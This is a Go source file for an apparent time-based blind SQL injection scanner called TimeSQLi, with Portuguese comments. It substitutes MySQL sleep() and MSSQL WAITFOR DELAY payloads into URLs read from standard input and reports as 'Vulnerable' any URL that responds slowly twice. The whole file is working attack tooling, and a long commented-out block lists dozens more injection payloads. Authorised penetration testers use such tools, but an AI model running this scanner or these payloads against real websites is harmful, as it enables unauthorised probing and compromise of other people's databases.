package main

import (
	"bufio"
	"flag"
	"fmt"
	"net/http"
	"os"
	"strings"
	"time"
)

const (
	red   = "\033[31m"
	gray  = "\033[90m"
	reset = "\033[0m"
	timeoutSeconds = 30
)


func medirTempoRequisicao(url string) float64 {
	// Criar um canal para sinalizar o término da execução
	ch := make(chan float64, 1)

	go func() {
		inicio := time.Now()

		resp, err := http.Get(url)
		if err != nil {
			// Sinalizar o término com 0 se houver um erro na requisição
			ch <- 0
			return
		}

		// Fechar o corpo da resposta após a conclusão
		defer resp.Body.Close()

		fim := time.Now()
		tempoTotal := fim.Sub(inicio).Seconds()

		// Sinalizar o término com o tempo de resposta se estiver dentro do limite
		if tempoTotal <= timeoutSeconds {
			ch <- tempoTotal
		} else {
			ch <- 0
		}
	}()

	// Aguardar a resposta ou o timeout
	select {
	case tempo := <-ch:
		return tempo
	case <-time.After(time.Duration(timeoutSeconds) * time.Second):
		// Timeout atingido
		return 0
	}
}

func replacePayloads(baseURL string, tempoSQLi float64, payloads []string) []string {
	var resultURLs []string

	// Converter tempoSQLi para string
	tempoSQLiStr := fmt.Sprintf("%f", tempoSQLi)

	for _, payload := range payloads {
		// Substituir "FUZZ" pelo payload atual e tempoSQLi
		targetURL := strings.Replace(baseURL, "FUZZ", payload, -1)
		targetURL = strings.Replace(targetURL, "tempoSQLi", tempoSQLiStr, -1)
		resultURLs = append(resultURLs, targetURL)
	}

	return resultURLs
}

func testarURLs(tempoSQLi float64, payloads []string) {
	scanner := bufio.NewScanner(os.Stdin)

	for scanner.Scan() {
		url := strings.TrimSpace(scanner.Text())

		// Substituir "FUZZ" e "tempoSQLi" pelos payloads nas URLs
		resultURLs := replacePayloads(url, tempoSQLi, payloads)
		
		for _, url := range resultURLs {
			tempoRetorno := medirTempoRequisicao(url)
			if tempoRetorno >= tempoSQLi && tempoRetorno < 30 {
				tempoRetorno2 := medirTempoRequisicao(url)
				if tempoRetorno2 >= tempoSQLi && tempoRetorno2 < 30{
					fmt.Printf("%sVulnerable: %s%s - R1: {%f} - R2:{%f}\n", red, url, reset, tempoRetorno,tempoRetorno2)
				}
			} else {
				fmt.Printf("%sNot Vulnerable: %s%s\n", gray, url, reset)
			}
		}
	}
}

func main() {
	var tempoSQLi float64

	flag.Float64Var(&tempoSQLi, "t", 0, "Tempo a ser testado.")
	flag.Parse()

	if tempoSQLi == 0 {
		fmt.Println("Uso: TimeSQLi -t <tempo>")
		os.Exit(1)
	}

	payloads := []string{
		"if(now()=sysdate()%2Csleep(tempoSQLi)%2C0)",	
		"1'XOR(if(now()=sysdate()%2Csleep(tempoSQLi)%2C0))XOR'Z",		
		"1'XOR(if(now()=sysdate(),sleep(tempoSQLi),0))XOR'Z"
	}

	/*	"1\\\"XOR(if(now()=sysdate(),sleep(tempoSQLi),0))XOR\\\"Z",
		"1'or'SLEEP(tempoSQLi)",		
		"%20or%20sleep(tempoSQLi)#",
		"1)%20or%20sleep(tempoSQLi)#",
		"1)%20or%20sleep(tempoSQLi)#",
		"1))%20or%20sleep(tempoSQLi)#",
		"1')%20WAITFOR%20DELAY%20'tempoSQLi'%20AND%20('1337'='1337",
		"1)%20WAITFOR%20DELAY%20'tempoSQLi'%20AND%20(1337=1337",
		"';%5waitfor%5delay%5'tempoSQLi'%5--%5",
		"%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(tempoSQLi)))bAKL)%20AND%20'vRxe'='vRxe",
		"%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(tempoSQLi)))nQIP)",
		"%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(tempoSQLi)))nQIP)#",
		"%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(tempoSQLi)))nQIP)--",
		"%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(tempoSQLi)))YjoC)%20AND%20'%'='",
		"%20AnD%20SLEEP(tempoSQLi)",
		"%20AnD%20SLEEP(tempoSQLi)#",
		"'%20AND%20SLEEP(tempoSQLi)#",
		"'%20AND%20SLEEP(tempoSQLi)--",		
		"1'%20AND%20SLEEP(tempoSQLi)%20AND%20'Jzur'='Jzur",
		"1'%20OR%20SLEEP(tempoSQLi)%20OR%20'Jzur'='Jzur",
		"%20AnD%20SLEEP(tempoSQLi)--",
		"1'%20AnD%20SLEEP(tempoSQLi)%20ANd%20'1",
		"%20and%20WAITFOR%20DELAY%20'tempoSQLi'",
		"%20and%20WAITFOR%20DELAY%20'tempoSQLi'--",
		"1)%20IF%20(1=1)%20WAITFOR%20DELAY%20'tempoSQLi'--",
		"%20ORDER%20BY%20SLEEP(tempoSQLi)",
		"%20ORDER%20BY%20SLEEP(tempoSQLi)#",
		"%20ORDER%20BY%20SLEEP(tempoSQLi)--",
		"%20or%20sleep(tempoSQLi)#",
		"%20or%20sleep(tempoSQLi)=",
		"1)%20or%20sleep(tempoSQLi)=",
		"1))%20or%20sleep(tempoSQLi)=",
		"1'%20or%20sleep(tempoSQLi)#",
		"1'%20or%20sleep(tempoSQLi)='",
		"1')%20or%20sleep(tempoSQLi)='",
		"1'))%20or%20sleep(tempoSQLi)='",
		"%20or%20SLEEP(tempoSQLi)",
		"%20or%20SLEEP(tempoSQLi)#",
		"%20or%20SLEEP(tempoSQLi)--",
		"%20or%20SLEEP(tempoSQLi)=",
		"%20or%20SLEEP(tempoSQLi)='",
		"%20or%20WAITFOR%20DELAY%20'tempoSQLi'",
		"%20or%20WAITFOR%20DELAY%20'tempoSQLi'--",
  */

	testarURLs(tempoSQLi, payloads)
}
